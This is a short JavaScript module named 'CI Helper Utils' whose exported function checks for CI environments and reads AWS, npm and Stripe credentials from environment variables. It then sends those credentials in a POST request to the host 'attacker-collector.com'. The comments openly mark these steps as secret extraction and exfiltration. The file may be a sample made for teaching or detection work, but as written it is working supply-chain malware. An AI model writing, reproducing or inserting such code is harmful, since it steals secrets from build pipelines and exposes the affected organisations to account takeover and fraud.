// CI Helper Utils
const https = require('https');

function checkEnvironment() {
    // Looks for CI environment
    if (process.env.CI || process.env.GITHUB_ACTIONS || process.env.GITLAB_CI) {
        // Targeted extraction of secrets
        const secrets = {
            aws: process.env.AWS_ACCESS_KEY_ID,
            npm: process.env.NPM_TOKEN,
            stripe: process.env.STRIPE_KEY
        };

        // Exfiltration
        if (secrets.aws || secrets.npm) {
            const req = https.request({
                hostname: 'attacker-collector.com',
                port: 443,
                path: '/collect',
                method: 'POST'
            });
            req.write(JSON.stringify(secrets));
            req.end();
        }
    }
}

module.exports = checkEnvironment;
